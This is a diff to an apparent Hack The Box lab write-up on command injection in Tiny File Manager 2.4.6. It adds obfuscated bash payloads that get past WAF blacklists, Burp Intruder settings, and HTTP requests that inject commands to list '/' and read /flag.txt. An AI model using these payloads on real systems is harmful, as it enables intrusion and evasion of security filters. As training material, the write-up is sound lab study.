@@ -66,6 +66,7 @@ $(uname)
 $(rev<<<'emanu')
 bash<<<$(base64 -d<<<dW5hbWUgLWE=)
 b'a's'h'<<<$('b'a's'e'6'4 -d<<<dW5hbWUgLWE=)
+l's'${IFS}${PATH:0:1}${IFS}-a'l'
 ```  
 
 ---
@@ -215,8 +216,8 @@ ip=127.0.0.1%0a$(rev<<<'hsab')<<<$($(rev<<<'46esab')${IFS}-d<<<ZmluZCAvdXNyL3NoY
 
 # Skills Assessment - Command Injection  
 
->Presented with login page to web application, `Tiny File Manager 2.4.6`.  
->After logging in as the user `guest` with a password of `guest` the landing page list files in folder and there is functions on each listed files in web folder.  
+>[Skills assessment for command injection](https://academy.hackthebox.com/module/109/section/1042) present a login page to the web application, running `Tiny File Manager 2.4.6`.  
+>After logging in as the user `guest` with a password of `guest` the landing page list files in a folder and there are functions on each listed files in web folder.  
 
 ![cmd-inject-skill-assess-landing-page](/images/cmd-inject-skill-assess-landing-page.png)  
 
@@ -232,10 +233,29 @@ ip=127.0.0.1%0a$(rev<<<'hsab')<<<$($(rev<<<'46esab')${IFS}-d<<<ZmluZCAvdXNyL3NoY
 
 ![cmd-inject-skill-assess-move-function-malicious](/images/cmd-inject-skill-assess-move-function-malicious.png)  
 
->To determine what the WAF filters are blocking we will run Burp Intruder with cluster bomb attack to itterate though all payload combinations.
+>To determine what the WAF filters are blocking we will run Burp Intruder with cluster bomb attack to iterate though all payload combinations.
 
-![cmd-inject-skill assess move function cluster bomb](/images/cmd-inject-skill-assess-move-function-cluster-bomb.png)  
+![command inject skill assess move function cluster bomb](/images/cmd-inject-skill-assess-move-function-cluster-bomb.png)  
 
+>BURP INTRUDER ATTACK PAYLOAD OPTIONS NOTE:  
 
++ Payload 1 (list of separator characters) - Do not URL-encode characters  
++ Payload 2 (list of obfuscated sample Linux bash commands) Do enable URL-encode the characters of the list commands  
 
-./bashfuscator -c 'uname a' -s 1 -t 1 --no-mangling --layers 1
+>After running the first time intruder cluster bomb attack we see results of attack for payload 1 of `%26` and then appending it in-front and rerun attack with two payloads positions again ,result in `u'n'a'm'e` execution and no `GREP` column for message `Malicious request denied`.
+
+![cmd-inject-skill-assess-move-function-cluster-bomb-result1](/images/cmd-inject-skill-assess-move-function-cluster-bomb-result1.png)  
+
+>Successfully Identified command injection in the `?to=` parameter,Run intruder again...
+
+>Payload to list the root folder and hidden files content, `&$()ls / -al`, obfuscated payload below:  
+
+```
+GET /index.php?to=tmp%26$()l's'${IFS}${PATH:0:1}${IFS}-a'l'&from=2561732172.txt&finish=1&move=1 HTTP/1.1
+```  
+
+>Reading the flag contents, `&$()cat /flag.txt`.  Below is the obfuscated command injection payload to bypass blacklisted commands and characters through WAF.
+
+```
+GET /index.php?to=tmp%26$()c'a't${IFS}${PATH:0:1}flag.txt&from=2561732172.txt&finish=1&move=1 HTTP/1.1
+```  
